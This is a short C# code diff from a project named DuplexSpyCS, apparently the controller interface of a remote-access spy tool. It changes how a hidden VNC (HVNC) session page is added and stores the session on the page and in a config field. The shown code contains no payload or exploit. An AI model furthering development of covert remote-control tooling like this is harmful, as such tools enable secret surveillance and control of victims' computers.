@@ -91,7 +91,7 @@ namespace DuplexSpyCS
                 szArguments = textBox3.Text,
             };
 
-            TabPage? page = m_fHVNC.fnAddNewPage(session, false);
+            TabPage? page = m_fHVNC.fnAddNewPage(session, true);
             if (page == null)
             {
                 MessageBox.Show("Page is null", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -99,6 +99,8 @@ namespace DuplexSpyCS
             }
 
             session.page = page;
+            page.Tag = session;
+            m_stConfig = session;
 
             Close();
         }
